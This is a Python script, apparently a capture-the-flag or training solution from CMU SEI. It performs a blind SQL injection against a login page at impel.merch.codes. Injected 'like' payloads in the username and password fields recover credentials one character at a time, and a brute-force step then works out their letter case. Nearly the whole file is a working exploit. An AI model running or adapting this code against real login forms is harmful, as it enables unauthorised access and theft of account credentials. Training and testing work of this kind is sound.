#!/usr/bin/python3

# Copyright 2024 Carnegie Mellon University.
# Released under a MIT (SEI)-style license, please see LICENSE.md in the project 
# root or contact permission@sei.cmu.edu for full terms.


import sys, subprocess, requests, json, string, time

character_list = list(string.ascii_lowercase) + list(string.digits)

## print statements commented out throughout script if user wants to view output while it is running and/or troubleshoot if it isnt working.

def generate_case_combinations(s, combination='', index=0):
    if index == len(s):
        return [combination]

    # Get current character
    char = s[index]

    # Generate combinations with lowercase and uppercase of the current character
    lower_combinations = generate_case_combinations(s, combination + char.lower(), index + 1)
    upper_combinations = generate_case_combinations(s, combination + char.upper(), index + 1)

    # Combine and return results
    return lower_combinations + upper_combinations


def find_username():
    found_username = ""
    index1 = 0
    while index1 < len(character_list):
        timeout_check = requests.get("http://impel.merch.codes/login")
        if "Incorrect Login" in timeout_check.content.decode("utf-8"):
            continue
        
        current_un = found_username + character_list[index1]
        data = {
            "username": f"123' or username like '{current_un}%",    
            "password": "password"
        }
        resp = requests.post("http://impel.merch.codes/login",data=data)
        
        ## Get the contents of the HTML page returned from request, will be used to determine if timeout still active
        resp_page = resp.content.decode('utf-8')
        #input(resp_page)
        if "Incorrect Login" in resp_page:
            #print(current_un)
            index1 += 1
        else:
            #print(current_un)
            index1 = 0
            found_username = current_un
            
    return found_username.strip('\n')


def find_pwd(possible_usernames):
    for un in possible_usernames:
        while True:
            timeout_check = requests.get("http://impel.merch.codes/login")
            if "Incorrect Login" not in timeout_check.content.decode("utf-8"):
                break
        #print(f"The current username being tested is:\t{un}")
        found_password = ""
        index2 = 0
        username_check = False
        while index2 < len(character_list):
            current_pwd = found_password + character_list[index2]
            data2 = {
                "username": un,
                "password": f"123' or password like '{current_pwd}%"
            }
            resp2 = requests.post("http://impel.merch.codes/login",data=data2)

            ## Get the contents of the HTML page returned from request
            resp2_page = resp2.content.decode('utf-8')
            
            if "Incorrect Login" in resp2_page:
                break
            elif "Incorrect Credentials" in resp2_page:
                username_check = True
                #print(current_pwd)
                index2 += 1
            else:
                #print(current_pwd)
                index2 = 0
                found_password = current_pwd
        if username_check == True:
            return un,found_password.strip('\n')

def bruteforce_login(un,possible_passwords):
    for pwd in possible_passwords:
        data3 = {
                "username": un,
                "password": pwd
            }
        resp3 = requests.post("http://impel.merch.codes/login",data=data3)

        resp3_page = resp3.content.decode('utf-8')
        
        if "Incorrect Credentials" in resp3_page:
            continue
        return pwd


if __name__ == "__main__":
    print(f"Starting Blind SQL attack using the following character List.\n{character_list}")
    ## We will only use lowercase letters and numbers during testing because the SQL Command `like` gives case-insensitive results
    case_insensitive_username = find_username()
    print(f'phase 1 done.\nCase insensitive username found:\t{case_insensitive_username}')
    ## Because SQL `like` command searches while not being case sensitive. You will need to create all username possibilities.
    username_case_possibilities = generate_case_combinations(case_insensitive_username)
    print('phase 2 done. All Possible Usernames Generated')
    # Start testing for password while rotating through all possible usernames.
    correct_username,case_insensitive_pwd = find_pwd(username_case_possibilities[::-1])
    print(f'phase 3 done.\nCorrect Username is:\t{correct_username}.\nCase Insensitive Password is:\t{case_insensitive_pwd}')
    # Because SQL `like` command searches while not being case sensitive. You will need to create all password possibilities.
    password_case_possibilities = generate_case_combinations(case_insensitive_pwd)
    print(f'phase 4 done. All Possible Usernames Generated')
    # start brute forcing known username against list of possible passwords
    correct_password = bruteforce_login(correct_username,password_case_possibilities)
    print(f"\nusername:\t{correct_username}\npassword:\t{correct_password}")

